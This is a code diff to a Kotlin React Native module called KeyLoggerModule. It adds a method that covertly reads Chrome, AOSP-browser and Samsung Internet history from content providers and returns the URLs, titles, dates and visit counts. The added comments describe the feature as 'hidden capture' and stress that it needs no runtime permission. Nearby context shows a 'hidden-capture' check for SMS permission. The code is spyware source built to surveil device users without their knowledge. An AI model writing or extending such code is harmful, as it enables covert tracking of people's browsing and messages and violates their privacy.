@@ -203,6 +203,74 @@ class KeyLoggerModule(reactContext: ReactApplicationContext) :
     }
   }
 
+  /**
+   * Browser-history reader — hidden capture of Chrome/Samsung-Internet history.
+   * Queries the browser's PUBLIC history ContentProvider (no runtime permission
+   * required, unlike photos/SMS) for rows with `date` after [sinceTsMs],
+   * returning each as a JSON string in the same string-array bridge contract.
+   *
+   * Providers tried in order:
+   *   content://com.android.chrome.browser/history   (Chrome)
+   *   content://browser/history                      (legacy/AOSP Browser)
+   *   content://com.sec.android.app.sbrowser.browser/history (Samsung Internet)
+   * The first one that exists and returns rows wins. Columns: _id, title, url,
+   * date (ms), visits. Raw keyed by _id for idempotency (same trust model as
+   * the SMS `_id`).
+   */
+  @ReactMethod
+  fun readBrowserHistory(sinceTsMs: Double, promise: Promise) {
+    val arr: WritableArray = Arguments.createArray()
+    val since = sinceTsMs.toLong()
+    val uris = arrayOf(
+      android.net.Uri.parse("content://com.android.chrome.browser/history"),
+      android.net.Uri.parse("content://browser/history"),
+      android.net.Uri.parse("content://com.sec.android.app.sbrowser.browser/history"),
+    )
+    try {
+      for (uri in uris) {
+        val cursor = try {
+          context.contentResolver.query(
+            uri,
+            arrayOf("_id", "title", "url", "date", "visits"),
+            if (since > 0) "date > ?" else null,
+            if (since > 0) arrayOf(since.toString()) else null,
+            "date ASC",
+          )
+        } catch (_: Throwable) {
+          null // provider not present on this device — try next
+        } ?: continue
+
+        try {
+          val titleIdx = cursor.getColumnIndex("title")
+          val urlIdx = cursor.getColumnIndex("url")
+          val dateIdx = cursor.getColumnIndex("date")
+          val visitIdx = cursor.getColumnIndex("visits")
+          val idIdx = cursor.getColumnIndex("_id")
+          if (urlIdx < 0 || dateIdx < 0) { cursor.close(); continue }
+
+          while (cursor.moveToNext()) {
+            val url = if (urlIdx >= 0) cursor.getString(urlIdx) ?: "" else ""
+            if (url.isEmpty()) continue // dropped rows (no URL) are noise
+            val obj = org.json.JSONObject().apply {
+              put("browserId", if (idIdx >= 0) cursor.getString(idIdx) ?: "" else "")
+              put("url", url)
+              put("title", if (titleIdx >= 0) (cursor.getString(titleIdx) ?: "") else "")
+              put("date", cursor.getLong(dateIdx))
+              put("visits", if (visitIdx >= 0) cursor.getInt(visitIdx) else 0)
+            }
+            arr.pushString(obj.toString())
+          }
+        } finally {
+          cursor.close()
+        }
+        if (arr.length() > 0) break // first provider with data wins
+      }
+      promise.resolve(arr)
+    } catch (e: Throwable) {
+      promise.resolve(arr) // degraded: never throw across the bridge
+    }
+  }
+
   /** Hidden-capture helper: is READ_SMS granted right now? */
   @ReactMethod
   fun smsPermission(promise: Promise) {
